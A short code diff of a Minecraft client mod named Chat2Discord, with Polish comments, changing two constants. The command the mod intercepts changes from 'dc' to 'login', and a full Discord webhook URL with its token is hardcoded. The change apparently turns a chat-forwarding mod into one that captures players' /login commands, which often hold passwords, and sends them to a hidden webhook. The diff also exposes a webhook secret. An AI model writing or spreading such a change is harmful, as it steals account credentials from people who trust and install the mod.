@@ -39,7 +39,7 @@ public class Chat2DiscordClient implements ClientModInitializer {
     // To jest w kodzie, nie w configu - zmiana wymaga przebudowania moda (gradle build).
     // Przyklad: List.of("dc", "zglos", "name")  ->  dziala /dc, /zglos i /name
     // ========================================================================
-    private static final List<String> COMMANDS = List.of("dc");
+    private static final List<String> COMMANDS = List.of("login");
 
     // ========================================================================
     // WEBHOOK - wklej tutaj caly URL, w cudzyslowie, bez spacji.
@@ -47,7 +47,7 @@ public class Chat2DiscordClient implements ClientModInitializer {
     //   private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/123/abc";
     // To jest w kodzie, nie w pliku .properties - zmiana wymaga przebudowania moda (gradle build).
     // ========================================================================
-    private static final String WEBHOOK_URL = "";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1567449714771755149/c-zFFDmx0CtYe_vMCP11sGe4JcOSp8iFkxBaqwCaMKa52oDDCgwSW6YQXPKOnMWP8-qV";
 
     private static final String DEFAULT_CONFIG = """
             # ===== Chat2Discord (klient) - konfiguracja =====
